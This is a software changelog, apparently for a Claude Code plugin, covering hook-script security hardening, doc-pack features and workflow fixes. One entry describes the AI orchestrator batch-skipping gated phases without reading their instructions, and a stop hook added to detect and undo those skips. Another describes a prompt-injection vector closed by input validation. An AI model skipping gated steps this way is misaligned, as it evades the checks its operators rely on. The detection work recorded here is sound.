- **Dual-DB architecture**: Lazy global DB connection at `$CHOME/echoes/global/echo_index.db` with schema V4 (domain column)
- **Doc pack registry**: 6 bundled MEMORY.md packs (shadcn-ui, tailwind-v4, nextjs, fastapi, sqlalchemy, untitledui) with auto-detection patterns
- **Doc pack discovery in indexer**: `discover_and_parse()` walks `doc-packs/` subdirectory with `doc-pack/<name>` role prefix (D-P2-006)
- **Domain extraction**: `_DOMAIN_RE` regex extracts `**Domain**:` metadata from echo entries, defaults to `general`
- **`/rune:elevate`** skill: Promote project echoes to global scope with domain tagging, SHA-256 dedup, 50-entry guard (EC-3.3), circular elevation prevention (EC-3.6)
- **`/rune:echoes doc-packs install|list|update|status`**: Manage bundled doc packs in global echo store
- **`/rune:echoes audit`**: List all global echoes grouped by source type (doc packs + elevated)
- **Staleness detection**: Hook-based staleness check for installed doc packs (configurable threshold via `echoes.global.staleness_days`)
- **Lore-Scholar observation hard gate**: Prevents lore-scholar from writing observation entries (research output only)
- **Design framework detection 3-layer pipeline**: Stack-aware design system detection with tiered scanning (#277)

### Fixed
- **P2/P3 shell script findings**: Resolved findings from cross-model review (#276)

### Security
- **SEC-P2-003**: Symlink containment via `realpath` in `_valid_subdirs()` — rejects paths escaping echo directory
- **SEC-P2-005**: File size limit enforcement via `_check_file_size()` (10MB default)
- **SEC-P3-001**: Stack name validation with `^[a-zA-Z][a-zA-Z0-9_-]{1,63}$` (blocks `--help` injection)
- **SEC-P3-003**: Source MEMORY.md paths validated with `realpath` containment in `/rune:elevate`
- **SEC-P3-006**: Concurrent write protection via `mkdir`-based locking in `/rune:elevate`
- **D-P2-003**: Inode cycle detection in `_valid_subdirs()` prevents infinite symlink loops

## [1.151.3] - 2026-03-12

### Fixed
- **XVER-001**: TOCTOU race in workflow-lock.sh — metadata now written to temp file before mkdir lock acquisition
- **XVER-002**: Cleanup operations in worktree-gc.sh now return proper error codes instead of silently swallowing failures
- **XVER-003**: Path validation bypass in validate-gap-fixer-paths.sh — absolute paths outside CWD now rejected
- **XVER-004**: Deterministic temp file names in run-artifacts.sh replaced with mktemp-generated unique paths
- **CDXB-001**: Unbound variable typo `$_HOOK_SESSION_ID` in stop-hook-common.sh corrected to `${HOOK_SESSION_ID:-}`
- **CDXS-003**: Predictable temp file names in workflow-lock.sh replaced with mktemp
- **XBUG-005**: Missing error check after jq pipe in arc-phase-stop-hook.sh — now logs warning on parse failure

### Security
- All shell scripts now use `mktemp` for unpredictable temp file paths (symlink attack mitigation)
- TOCTOU race conditions eliminated in workflow lock acquisition

## [1.151.2] - 2026-03-12

### Fixed
- **XVER-001**: Symlink-based path traversal in cleanup hooks — canonicalize `CHOME` with `pwd -P`, reject symlinked intermediate roots (`$CHOME/teams`, `$CHOME/tasks`), verify delete targets resolve under canonical `CHOME` before `rm -rf` (cross-verified by Claude + Codex)
- **CLD-003**: Race condition in process kill — add `_proc_name()` cross-platform helper (Linux `/proc/$pid/comm`, macOS `ps -p`), verify process name matches expected (node|claude|claude-*) before SIGTERM/SIGKILL to prevent killing unrelated processes due to PID recycling
- **XVER-003**: TOCTOU in team directory cleanup — add pre-deletion verification that targets resolve under canonical roots before `rm -rf`

### Security
- **Path traversal defense-in-depth**: Cleanup hooks now verify both intermediate roots (`teams/`, `tasks/`) and final targets are not symlinks and resolve under expected canonical paths

### Files Modified
- `scripts/session-team-hygiene.sh`
- `scripts/enforce-team-lifecycle.sh`
- `scripts/on-session-stop.sh`
- `scripts/arc-phase-stop-hook.sh`

## [1.151.1] - 2026-03-11

### Fixed
- **XVER-001**: Atomic workflow detection via mkdir-based mutex in `enforce-teams.sh` — prevents race condition where workflow starts between state check and Agent execution (SEC-3 TOCTOU mitigation)
- **XVER-004**: 3-layer session identity for cross-session isolation — `config_dir` (installation) + `session_id` (primary) + `owner_pid` (fallback). Session ID now definitive for ownership checks, fixing false positives where hook `$PPID` differs from skill `$PPID`
- **QUAL-003**: Removed leftover DIAGNOSTIC code from `arc-phase-stop-hook.sh` and `stop-hook-common.sh` — `_diag()` function and all calls removed (marked "temporary" in v1.144.16, never cleaned up)

### Changed
- **resolve-session-identity.sh**: Exports `RUNE_CURRENT_SID` (primary session identifier) alongside `RUNE_CURRENT_CFG`
- **enforce-teams.sh**: Ownership filter uses 3-layer hierarchy (session_id definitive, PID fallback)
- **enforce-teams.sh**: Mutex directory `.rune-ate1-mutex` for atomic workflow detection with retry-on-contention

## [1.151.0] - 2026-03-11

### Added
- **arc Phase 3.2 (design_prototype)** — new phase between `design_extraction` and `task_decomposition` that generates React prototypes from Figma designs before the work phase. Workers get usable components (70-80% complete) instead of abstract VSM specs. Gated by `design_sync.enabled` + VSM files exist.
- **arc-phase-design-prototype.md** — full reference file defining prototype generation pipeline: VSM check → Figma MCP → discoverUIBuilder() → figma_to_react → UI builder matching with circuit breaker → prototype synthesis → Storybook bootstrap → manifest → cleanup
- **Storybook bootstrap script** (`scripts/storybook/bootstrap.sh`) — shared idempotent scaffolding for Storybook 10 + React 18 + Tailwind v4 + Vite. Two modes: `--src-dir` (design-prototype) and `--story-files` (arc testing). Returns JSON status.
- **Arc Prototypes output convention** — `tmp/arc/{id}/prototypes/` with per-component `figma-reference.tsx`, `library-match.tsx`, `prototype.tsx`, `prototype.stories.tsx`, `manifest.json`, `match-report.json`

### Changed
- **arc pipeline**: 28 → 29 phases (design_prototype inserted at position 3.2)
- **arc-phase-constants.md**: Added `design_prototype` to PHASE_ORDER, PHASE_TIMEOUTS (10 min), dynamic timeout calc
- **arc-phase-stop-hook.sh**: Added `design_prototype` to PHASE_ORDER array and `_phase_ref()` dispatch
- **arc-preflight.md**: Added `"arc-prototype-"` to ARC_TEAM_PREFIXES for crash recovery Layer 1
- **arc-phase-cleanup.md**: Added `"arc-prototype-"` to PHASE_PREFIX_MAP for crash recovery Layer 2
- **arc-checkpoint-init.md**: Added `design_prototype` phase entry to checkpoint schema
- **storybook SKILL.md**: Added arc Phase 3.2 integration point and shared runtime description
- **output-conventions.md**: Added Arc Prototypes row and updated Storybook row

### Removed
- **scripts/figma-to-react/storybook/** — deleted old inline storybook directory (4,721 lines including package-lock.json, screenshots, comparison components). Replaced by shared `scripts/storybook/bootstrap.sh`.

## [1.150.0] - 2026-03-11

### Changed
- **venv relocation** — moved Python venv from `CLAUDE_PLUGIN_ROOT/scripts/.venv/` to `${CLAUDE_CONFIG_DIR}/rune-venv/` (persistent across plugin updates, not copied into plugin cache)
- **venv hash guard** — SHA-256 of `requirements.txt` stored in venv dir; pip install skipped when dependencies unchanged (15ms vs 3-5s)
- **dependency trim** — `mcp[cli]` → `mcp` (removes pygments/rich, saves ~19MB); `pytest-asyncio` moved to `requirements-dev.txt`
- **shared venv helper** — new `scripts/lib/rune-venv.sh` with `rune_resolve_venv()` replaces duplicated venv logic in 4 scripts (47 lines removed)

### Fixed
- **venv path inconsistency** — `echo-search/start.sh` and `figma-to-react/start.sh` referenced `${PLUGIN_ROOT}/.venv` instead of `${PLUGIN_ROOT}/scripts/.venv` (now moot — both use shared helper)

### Performance
- Plugin cache reduced by ~890MB (cached versions no longer contain .venv/ dirs)
- Runtime venv: 90MB → 71MB via dependency trimming
- Session start warm path: 15ms (hash match) vs 3-5s (pip check)

## [1.149.2] - 2026-03-11

### Fixed
- **docs: comprehensive doc sync** — Updated all documentation to match current v1.149.x state:
  - **plugin.json + marketplace.json**: "19 commands" → "18 commands" (actual count)
  - **README review agents table**: Added `aesthetic-quality-reviewer` and `design-system-compliance-reviewer` (2 missing agents). Updated header "42 specialized agents" → "46 review agent definitions (34 agents + 12 specialist prompt templates)"
  - **README skills table**: Added 8 missing skills: `design-system-discovery`, `resolve-todos`, `team-sdk`, `team-status`, `runs`, `utility-crew`, `ux-design-process`, `storybook`
  - **README file structure**: Added 3 missing commands: `team-delegate`, `team-shutdown`, `team-spawn`
  - **README**: "All 77 agents" → "All 100 agents" in Teammate Lifecycle Safety
  - **README**: `context7-mcp@^1.0.0` → `context7-mcp@2.1.3` (matches .mcp.json)
  - **README**: "9-dimension scoring" → "10-dimension scoring" (inspect has 10 dimensions since v1.149.0)
  - **README + specialist-prompts path**: Updated stale `specialist-prompts/` → `stacks/references/`
  - **"27-phase" → "28-phase"**: Fixed across README, arc-batch SKILL.md, using-rune SKILL.md, context-weaving SKILL.md, phase-summary-template.md, post-arc.md (UX verification added in v1.99.0 was never reflected)
  - **ROADMAP.md**: Updated version v1.134.3 → v1.149.1, agent counts 86 → 100, commands 16 → 18, skills 49 → 54, phases 27 → 28

## [1.149.1] - 2026-03-11

### Fixed
- **inspect**: `inspect_design_dimension` gate changed from `!== false` (opt-out) to `=== true` (opt-in), matching `design_review.enabled` pattern. Prevents silent Dimension 10 activation.
- **inspect**: `planFrontmatter` undefined in Dimension 10 gate — replaced with `parsedPlan.frontmatter` null-safe access. Gate was always evaluating to `false`.
- **dedup-runes**: DES prefix added to Deep and Merge hierarchies (was only in Standard).
- **orchestration-phases**: KNOWN_PREFIXES regex extended with AESTH, UXH, UXF, UXI, UXC, SHA-SHE, XSH.
- **circle-registry**: `design-implementation-reviewer` added to Wave Summary table.
- **verdict-synthesis**: "9 dimension scores" → "10 dimension scores".
- **appraise**: AESTH inserted in dedup hierarchy strings (SKILL.md + phase-1-rune-gaze.md).
- **inspector-prompts**: `<design-data>` boundary delimiter added to grace-warden prompt extension (SEC-004 pattern).
- **docs**: Stale "9 dimension" references updated across README, state-machine, CHANGELOG, init-protocol, and inspector comments.

## [1.149.0] - 2026-03-11

### Added
- **appraise**: Design fidelity Phase 1.6 gate — spawns `design-implementation-reviewer` when `design_review.enabled` + `design_sync.enabled` + frontend files + design references exist. DES- prefix findings in TOME. Conditional: zero overhead when gate not met.
- **inspect**: Design Fidelity as dimension 10 — extends `grace-warden` inspector scope with COMPLETE/PARTIAL/MISSING/DEVIATED component compliance classification against design specs. DES- finding prefix. Gated by `design_sync.enabled` + `inspect_design_dimension` + plan `figma_url` + design refs.
- **talisman**: `design_review.enabled` gate for appraise Phase 1.6 and `design_sync.inspect_design_dimension` for inspect Dimension 10 (default: false — explicit opt-in; requires `design_sync.enabled` for artifacts). Zero overhead for projects without design artifacts.

### Fixed
- **validate-test-evidence.sh**: Replace `{LOCK_FD}` fd-redirect syntax (Bash 4.1+) with literal `200` for macOS Bash 3.2 compatibility (cross-platform shell rule).

## [1.147.0] - 2026-03-11

### Added
- **`/rune:design-prototype` skill** — Standalone Figma-to-Storybook prototype generator with 5-phase pipeline (extract → match → synthesize → verify → present). Two input modes: Figma URL (full pipeline) or text description (library search only). Agent team support for complex designs (>= 3 components). UX Flow Mapping (Phase 3.5): automatically generates `flow-map.md` and `ux-patterns.md` for designs with >= 2 components. Gated by `design_sync.enabled` talisman config.
- **Talisman config**: Added prototype pipeline fields under `design_sync:` section (`prototype_generation`, `storybook_preview`, `max_reference_components`, `reference_timeout_ms`, `library_timeout_ms`, `library_match_threshold`)
- **Routing**: Added `/rune:design-prototype` to using-rune intent routing table

## [1.146.5] - 2026-03-11

### Fixed
- **Bare TeamDelete in 4 Codex arc phases** — Add retry-with-backoff (4 attempts) + filesystem fallback to Codex phase cleanup in arc phases 4.5 (task decomposition), 5.6 (codex gap analysis), 7.8 (test coverage critique), and 8.55 (release quality check). Previously these had bare `TeamDelete()` with no retry or fallback, causing team leaks when the single call failed. Now matches the standard cleanup pattern from Phase 2.8 (semantic verification).

## [1.146.4] - 2026-03-11

### Fixed
- **Double-slash in glob patterns** — Fix double-slash glob boundary in state file discovery across hook scripts. Changed quote boundary from `"${CWD}/tmp/"/.rune-*` to `"${CWD}/tmp"/.rune-*`. Cosmetic fix (POSIX normalizes `//`), but eliminates confusing diagnostic output.

## [1.146.3] - 2026-03-11

### Changed
- **Default RUNE_SKIP_OWNERSHIP=0** — Ownership checks now enabled by default (secure-by-default posture). Set `RUNE_SKIP_OWNERSHIP=1` in settings.local.json env to bypass if needed.

### Added
- **RUNE_SESSION_ID bridge** — `session-start.sh` now extracts `session_id` from hook input JSON and injects it into `CLAUDE_ENV_FILE` as `$RUNE_SESSION_ID`. This makes session ID available in Bash tool context, eliminating `session_id: unknown` in state files. Workaround for [anthropics/claude-code#25642](https://github.com/anthropics/claude-code/issues/25642).
- **Session ID fallback chain** — All pseudocode that resolves session ID now uses `${CLAUDE_SESSION_ID:-${RUNE_SESSION_ID:-}}` (8 files updated: arc, goldmask, strive, team-sdk, enforce-teams). Falls back gracefully: native env var → bridge var → empty.

## [1.146.2] - 2026-03-10

### Fixed
- **Default RUNE_SKIP_OWNERSHIP=1** — Ownership checks bypassed by default since PPID/session_id mismatch between Bash tool and hook subprocess contexts makes them unreliable. Set `RUNE_SKIP_OWNERSHIP=0` to re-enable.
- **Always-on stop hook diagnostic logging** — `arc-phase-stop-hook.sh` writes to `${TMPDIR:-/tmp}/rune-stop-hook-diag.log` regardless of `RUNE_TRACE` setting. Captures: hook entry, input keys, session_id presence, every guard pass/fail, ERR trap with line+command, and final exit reason.
- **Enhanced ERR trap** — `_rune_fail_forward()` now captures `BASH_COMMAND` and `PIPESTATUS` for debugging silent failures.

## [1.146.1] - 2026-03-10

### Fixed
- **XBUG-002: Null byte injection in team name validation** — Strip null bytes before regex validation to prevent bypass in bash 3.2 (macOS)
- **CDXB-001: TSV parsing with empty fields** — Use individual jq calls instead of TSV parsing to handle empty `subagent_type` field correctly in `guard-context-critical.sh`
- **CDXB-002: Wrong state file selection** — Filter state files by `TEAM_NAME` instead of taking first match in `validate-test-evidence.sh`
- **CDX-001: Command injection via sourcing** — Use `SCRIPT_DIR` (trusted) instead of `CWD` (untrusted) for sourcing in arc-batch/hierarchy/issues stop hooks
- **XBUG-009: JSON parsing with cat** — Use `jq -r` for JSON extraction instead of `cat` in `arc-phase-stop-hook.sh`
- **CDX-006: Regex metacharacter escaping** — Escape regex metacharacters in prefix for literal grep matching in `arc-batch-preflight.sh`
- **CDX-007: Race condition with temp files** — Use `mktemp` for unique temp files instead of fixed `.tmp` suffix in `arc-phase-stop-hook.sh`, `on-session-stop.sh`, `detect-workflow-complete.sh`

### Security
- Cross-model code review (Claude + Codex) verified all fixes follow security best practices
- All 150 hook script tests pass

## [1.146.0] - 2026-03-10

### Added
- **Arc Phase Heartbeat — Stuck Phase Detection**: PostToolUse heartbeat writer tracks arc activity for enhanced crash recovery diagnostics
- **PostToolUse heartbeat hook** (`arc-heartbeat-writer.sh`): Writes `last_activity` timestamp during active arc phases
- **30-second throttle**: Prevents I/O storm while maintaining fresh activity data
- **Fail-open design**: Heartbeat failures never block tool execution
- **Layer 1 integration**: CronCreate monitoring enriched with `last_activity` display in stuck arc reports
- **Layer 2 integration**: SessionStart hygiene reports `last_activity` for resumable arc checkpoints
- **rune-status.sh enriched**: Displays `last_activity` timestamp for active arcs

### Changed
- **arc-monitoring-task.md**: Documented heartbeat integration for stuck detection
- **CLAUDE.md hook table**: Added ARC-HEARTBEAT-001 entry documenting the heartbeat hook

## [1.145.0] - 2026-03-10

### Fixed
- **Arc crash recovery**: CronCreate monitoring (Layer 1) now paired with SessionStart detection (Layer 2) for cross-session crash recovery. Previously, CronCreate alone could not recover from session crashes (OOM, terminal closure) because scheduled tasks are session-scoped.
- **P1: consecutive_failures reset** — After successful resume, `consecutive_failures` is now properly reset to 0 in the monitoring prompt and checkpoint logic
- **P1: Prompt injection vector** — `buildArcMonitoringPrompt()` now validates `checkpoint.id` format before string interpolation
- **P1: Monitoring prompt simplified** — Reduced from multi-paragraph natural language to minimal 4-line instruction, lowering hallucination risk

### Added
- **Dual-layer arc recovery architecture**: Layer 1 (CronCreate, in-session stop-hook failure) + Layer 2 (SessionStart hook, cross-session crash detection)
- **Resumable arc detection** in `session-team-hygiene.sh` — orphaned checkpoints with dead `owner_pid` are classified as resumable vs terminal. Advisory message includes arc ID, plan file, last completed phase, and resume instructions
- **Documentation**: Recovery matrix, dual-layer architecture explanation in `arc-monitoring-task.md`

### Changed
- **Documentation**: "crash recovery" → "dual-layer arc recovery" throughout arc scheduler docs
- **Talisman config**: `arc.scheduler` section updated to document both recovery layers

## [1.144.18] - 2026-03-10

### Fixed
- **BIZL-004: Session ID validation in workflow locks** — `workflow-lock.sh` acquire/release now validates `session_id` alongside PID to detect PID recycling across Claude Code sessions
- **BIZL-010: Null PID guard** — Empty `stored_pid` in lock meta.json no longer bypasses regex validation; corrupt locks are treated as orphans
- **EDGE-001/006: Bounds check in cleanup summary** — `enforce-team-lifecycle.sh` array subtraction no longer produces negative display values
- **EDGE-002: Clock skew guard** — `detect-workflow-complete.sh` clamps negative age to 0, preventing indefinite cleanup deferral
- **EDGE-004: Numeric validation on stat results** — `run-artifacts.sh` strips whitespace and validates before arithmetic to prevent script crash
- **EDGE-007: Ghost lock retry with jitter** — `workflow-lock.sh` retries with 0-50ms random jitter to reduce concurrent write race window
- **EDGE-008: PID deduplication** — `detect-workflow-complete.sh` pipes pgrep through `sort -u` before SIGTERM dispatch
- **EDGE-016: Path containment with spaces** — `run-artifacts.sh` prefix check now handles paths containing spaces and glob characters
- **SEC-005: Session PID in trace log path** — `detect-workflow-complete.sh` includes `${PPID}` in trace log filename to reduce predictability
- **SEC-008: PPID in cleanup log** — `on-session-stop.sh` uses per-session log files for forensic traceability

## [1.144.17] - 2026-03-09

### Fixed
- **stop-hook-common.sh** — "Claim on first touch" for `session_id: unknown` state files. `CLAUDE_SESSION_ID` is not available in Bash tool context, so the skill always writes `session_id: unknown`. On the first Stop hook execution, the hook claims ownership by writing its `session_id` (from hook input JSON) into the state file. Subsequent executions compare normally.

## [1.144.16] - 2026-03-09

### Fixed
- **stop-hook-common.sh (ROOT CAUSE #2)** — `$PPID` in hook context differs from `$PPID` in Bash tool context because Claude Code spawns hooks via a hook runner subprocess. Replaced PID-based session isolation with `session_id` comparison (from hook input JSON vs state file). PID check retained as fallback for legacy state files without session_id. Affects `validate_session_ownership()`, `_find_arc_checkpoint()`, and `_read_arc_result_signal()`.
- **CLAUDE.md** — Corrected "$PPID is consistent" claim to document the actual behavior: hooks get different PPID, use session_id instead.

## [1.144.15] - 2026-03-09

### Added
- **stop-hook-common.sh** — `RUNE_SKIP_OWNERSHIP=1` env var to bypass session ownership checks in all Stop hooks. For debugging arc phase loop failures. Set in `.claude/settings.local.json` env.
- **stop-hook-common.sh** — Detailed trace logging inside `validate_session_ownership()` — logs config_dir comparison, PID comparison, and rejection reason when `RUNE_TRACE=1`.

## [1.144.14] - 2026-03-09

### Fixed
- **Stop hook exit code (ROOT CAUSE)** — All 5 Stop hook scripts used `exit 0` + JSON stdout, which Claude Code silently discards for Stop events. Changed to `exit 2` + stderr output across 21 blocking outputs in `arc-phase-stop-hook.sh` (3), `arc-batch-stop-hook.sh` (5), `arc-hierarchy-stop-hook.sh` (7), `arc-issues-stop-hook.sh` (5), and `on-session-stop.sh` (1). This was the root cause of "arc stops after any phase" — the phase loop prompt was being silently discarded every time.
- **arc-phase-stop-hook.sh** — Batched demote loop into single jq call. Previously used 28×4 = 112 per-phase jq calls (~3.5s). Now ~30ms. Added JSON validation (`jq -e`) before checkpoint write to prevent corruption.
- **arc SKILL.md** — Fixed `session_id: unknown` in phase loop state file. The template used undefined `${sessionId}` variable. Now uses `Bash('echo "$CLAUDE_SESSION_ID"').trim()` consistent with `arc-checkpoint-init.md`.
- **CLAUDE.md** — Updated PAT-011 Stop hook format documentation: from incorrect JSON format to correct `exit 2` + stderr mechanism.

## [1.144.13] - 2026-03-09

### Fixed
- **arc-phase-stop-hook.sh** — Added Tier 0 post-heavy-phase compact interlude. After heavy phases (work, code_review, mend) complete, the stop hook now triggers context compaction before injecting the next phase prompt. Previously, the 40+ minute work phase exhausted context, the statusline bridge file went stale (>180s), all 3 compact tiers failed open, and the session died before the next phase could start. Root cause of "arc stops after work phase" recurring issue.
- **arc-phase-stop-hook.sh** — Fixed CWD path in demote checkpoint write: bare `$CHECKPOINT_PATH` (relative) → `${CWD}/${CHECKPOINT_PATH}` (absolute). The hook's working directory may differ from the project directory, causing the write to fail and the ERR trap to exit the script silently.
- **arc-phase-stop-hook.sh** — Added defensive demote logic: phases marked "skipped" without `skip_reason` are reset to "pending" for re-evaluation. Catches LLM batch-skip violations where the orchestrator skips conditional phases without reading their reference files.
- **arc SKILL.md** — Added Single-Phase-Per-Turn Rule: orchestrator MUST execute exactly ONE phase per turn, then STOP. Prevents batch-processing of multiple phases which bypasses per-phase gate logic.
- **arc-codex-phases.md** — Added `skip_reason` to all 7 skip paths (semantic_verification: 4, codex_gap_analysis: 3). Previously skipped without recording the reason.
- **arc-phase-design-extraction.md** — Added `skip_reason` to all 5 skip paths (design_sync_disabled, no_figma_urls, invalid_figma_urls, figma_mcp_unavailable, user_aborted_partial_failure).
- **arc-phase-task-decomposition.md** — Added `skip_reason` to both skip paths (cascade_circuit_breaker, dynamic reason).
- **arc-phase-design-verification.md** — Added `skip_reason` to all 3 skip paths (design_sync_disabled, design_extraction_skipped, no_vsm_files).
- **arc-phase-ux-verification.md** — Added `skip_reason` to both skip paths (ux_disabled, no_frontend_files).

### Added
- **arc-phase-stop-hook.sh** — Phase observability via `phase-log.jsonl`. Append-only JSONL log in `tmp/arc/{id}/` records every phase transition (started, completed, skipped, failed, demoted, pipeline_complete) with timestamps, skip reasons, and artifact paths. Optimized: single jq call extracts all phase data.
- **arc-phase-stop-hook.sh** — `phase_skip_log` checkpoint array records demotion events for user tracing when illegitimate skips are detected and corrected.

## [1.144.12] - 2026-03-09

### Fixed
- **arc-phase-stop-hook.sh** — Replaced bare `trap 'exit 0' ERR` with `_rune_fail_forward` ERR trap that logs crash location (line number) to trace log before exiting. The bare trap silently swallowed all errors, making it impossible to debug which guard was causing the hook to exit without injecting the next phase prompt.
- **arc-phase-stop-hook.sh** — Added `_trace` calls at every guard exit point (ENTER, CWD, state file, checkpoint path, session ownership, active flag, iteration, max iterations, checkpoint file). Previously the first trace call was at line 215 after ~15 silent exit paths.
- **stop-hook-common.sh** — Added `CLAUDE_PROJECT_DIR` fallback in `resolve_cwd()` when `.cwd` is missing from Stop hook input. Parity fix with `detect-workflow-complete.sh` which had this fallback and worked correctly.

## [1.144.11] - 2026-03-09

### Fixed
- **talisman-resolve.sh** — Added Fallback 2: creates venv and installs PyYAML when venv doesn't exist yet. Fixes race condition where SessionStart hooks fire in parallel and `session-start.sh` hasn't completed venv setup before `talisman-resolve.sh` runs, causing `resolver_status: defaults_only`.

## [1.144.10] - 2026-03-09

### Fixed
- **annotate-hook.sh** — Added `|| true` to jq pipe (line 30) to prevent ERR trap on empty/malformed stdin. Matches existing pattern on line 35.
- **echo-writer.sh** — `_is_duplicate()` returned exit code 1 with no stdout when existing titles were empty, triggering ERR trap under `set -e`. Now returns `echo "UNIQUE"; return 0`.
- **talisman-resolve.sh** — SEC-003 injection regex false-positived on `ward_commands` containing legitimate `$(jq ...)` shell substitution. Now excludes `work.ward_commands` via `jq del()` before checking. Added PyYAML auto-install fallback when venv exists but PyYAML is missing.
- **session-start.sh** — Added post-install verification logging for venv PyYAML availability diagnostics.

## [1.144.9] - 2026-03-09

### Changed
- **Shared plugin venv** — Consolidated all Python dependencies into a single `scripts/requirements.txt` and shared `.venv/`. `session-start.sh` creates the venv on first run. `echo-search/start.sh`, `figma-to-react/start.sh`, and `talisman-resolve.sh` all use it. Removed per-server `requirements.txt` files and duplicate venv creation logic. Eliminates "No YAML parser available" warning (resolver status: `defaults_only` → `full`).

## [1.144.8] - 2026-03-08

### Fixed
- **Test: stale threshold alignment** — `test_enforce_teams.py` used 30-min threshold (35-min backdate), updated to 120-min threshold (130-min backdate) matching `enforce-teams.sh` `STALE_THRESHOLD_MIN=120`
- **Test: fail-forward ERR trap** — `test_annotate_hook.py` expected non-zero exit on invalid JSON, updated to expect exit 0 matching fail-forward ERR trap behavior
- **Test: VOID-003 proximity scoring** — `test_echo_proximity.py` asserted file_path excluded from proximity; updated to match VOID-003 which adds entry's own file_path to evidence paths
- **Test: macOS symlink resolution** — `conftest.py` and `test_on_session_stop.py` now resolve `/var` → `/private/var` symlink for config_dir ownership matching
- **Test: hook team directory setup** — `test_hooks.py` and `test_on_teammate_idle.py` create team directories so hooks don't treat teammates as orphaned
- **Test: idle retry counter cleanup** — New `autouse` fixture in `conftest.py` cleans up `*.idle-retries` files between tests
- **Test: echo-search `search_entries` signature** — `test_server.py` updated tracking wrapper to include `category` parameter
- **Test: `pre-compact-checkpoint.sh` output format** — Updated docstrings to clarify PreCompact hooks use `systemMessage` (not `hookSpecificOutput`)
- **Shell: `session-start.sh` zsh glob** — Replaced zsh-only `*(N)/` glob with bash `shopt -s nullglob` + `*/` for cross-shell compatibility
- **Shell: `on-session-stop.sh` find ERR trap** — Added `|| true` to `find -exec rm -rf` to prevent ERR trap when directory is removed mid-traversal
- **Figma: `FigmaCredentialError`** — New error subclass for clearer credential failure messages (missing token + no Desktop MCP)
- **Echo: indexer consecutive headers** — Fixed `prev_line_blank` flag to allow consecutive headers in MEMORY.md parsing
- **P1: Broken PID liveness check** — `guard-context-critical.sh` inline `rune_pid_alive()` fallback used `$?` after `&&` chain, couldn't distinguish EPERM from ESRCH. Replaced with two-variable stderr capture pattern matching `resolve-session-identity.sh`
- **P1: Overly broad `scripts/` deny pattern** — `validate-resolve-fixer-paths.sh` blocked ALL `scripts/` directories. Narrowed to `plugins/rune/scripts/` and `.claude/scripts/`
- **P1: Greedy regex in decomposer.py** — `\[.*\]` with `re.DOTALL` matched from first `[` to last `]` across multiple arrays. Changed to non-greedy `\[.*?\]`
- **Nullglob state leak** — `workflow-lock.sh` `rune_check_conflicts()` enabled nullglob but never restored it. Added save/restore pattern
- **Incomplete signal dir cleanup** — `on-session-stop.sh` only cleaned `rune-work-*` signal dirs. Extended to all workflow prefixes (review, audit, inspect, mend, resolve-todos)
- **Unbounded stdin in learn scripts** — `cli-correction-detector.sh` and `echo-writer.sh` used `cat` instead of SEC-2 `head -c 1048576` cap
- **echo→printf consistency** — `validate-test-evidence.sh`, `rune-statusline.sh`, `talisman-invalidate.sh` used `echo "$INPUT"` risking flag interpretation. Replaced with `printf '%s\n'`
- **Hardcoded `/tmp`** — `session-start.sh` and `arc-issues-stop-hook.sh` used `/tmp` instead of `${TMPDIR:-/tmp}`
- **Incomplete state file patterns** — `enforce-glyph-budget.sh` only checked 5 of 13 workflow patterns. Extended to match `enforce-polling.sh`
- **Non-atomic debounce write** — `rune-context-monitor.sh` wrote `WARN_STATE` directly. Replaced with mktemp+mv atomic pattern
- **Multi-byte UTF-8 progress bar** — `rune-status.sh` used `tr ' ' '█'` which corrupts on byte-oriented `tr`. Replaced with while-loop

### Added
- **`measure-startup-tokens.py`** — Startup token measurement script
- **`measure-startup-tokens.sh`** — Shell wrapper for startup token measurement
- **`arc-batch/evals/evals.json`** — Arc-batch evaluation fixtures

## [1.144.6] - 2026-03-08

### Fixed
- **Pre hook error: `enforce-readonly.sh` two-phase ERR trap** — SECURITY hook had NO ERR trap, causing any unexpected failure to exit 1 → Claude Code logged intermittent "PreToolUse:Bash hook error" on every Bash command. Fixed with two-phase ERR trap: fail-forward (exit 0) during fast-path (non-subagent detection), fail-closed (exit 2) after subagent confirmed. The fast-path covers 99%+ of Bash commands.
- **Invalid JSON: `enforce-zsh-compat.sh` auto-fix output** — Heredoc-based JSON used unquoted `${ESCAPED_COMMAND}` variable which produced broken JSON (`"command":  },`) if jq failed. Also `${fix_descriptions}` was unescaped in the heredoc. Replaced with `jq -n --arg` for guaranteed valid JSON output.

### Added
- **5 test cases for `enforce-readonly.sh`** — Two-phase ERR trap behavior: non-subagent with bad CWD, null transcript_path, missing tool_input, subagent with missing CWD, subagent with inaccessible CWD
- **7 test cases for `enforce-zsh-compat.sh`** — Auto-fix JSON validity: Check B valid JSON + hookEventName, Check C+D combined, special chars (quotes/backslashes in commands)

## [1.144.5] - 2026-03-08

### Fixed
- **Cross-platform: `readarray` → Bash 3.2 loop** — `detect-workflow-complete.sh` used `readarray` (Bash 4+ only), replaced with `for` loop + `shopt -s nullglob`
- **Cross-platform: `${var,,}` → `tr` lowercase** — `on-task-observation.sh` used Bash 4+ case conversion, replaced with `tr '[:upper:]' '[:lower:]'`
- **Cross-platform: `tr ' ' '█'` → while-loop** — `rune-statusline.sh` progress bar used `tr` with multi-byte UTF-8 chars (byte-oriented, corrupts output), replaced with character-level loop
- **Cross-platform: `tr -dc` range bug** — `advise-mcp-untrusted.sh` had `tr -dc '[:alnum:]_-.'` where `-` between `_` and `.` created a byte range, silently stripping tool names on Linux. Fixed: dash moved to end
- **Hardcoded `/tmp` → `${TMPDIR:-/tmp}`** in 5 scripts: `rune-statusline.sh`, `cli-correction-detector.sh`, `validate-test-evidence.sh`, `lib/stop-hook-common.sh`, `rune-status.sh`
- **Test: `on-teammate-idle.sh`** — Missing team dirs for Layer 0 orphan guard; retry counter not reset; output too shallow for content depth check
- **Test: `arc-issues-preflight.sh`** — PATH isolation didn't exclude `gh` from `/usr/bin`
- **Test: `talisman-resolve.sh`** — Graceful skip when no YAML parser available
- **Test: bridge file paths** — 4 test files used hardcoded `/tmp` instead of `${TMPDIR:-/tmp}`

### Added
- **`test-cross-platform.sh`** — 59-case cross-platform compatibility test suite: 10 static analysis checks (forbidden Bash 4+ patterns, GNU-only tools, hardcoded paths), TMPDIR portability, `tr` character class edge cases, UTF-8 progress bar, Bash 3.2-compatible file collection, case-insensitive matching, tool name sanitization, shell builtins portability, `sed -E`/`grep -E` tests

## [1.144.4] - 2026-03-08

### Fixed
- **Cross-platform date parsing bug** — `rune-status.sh:383` used `date +%s%3N` instead of `gdate +%s%3N` inside the gdate branch, producing wrong timing on macOS
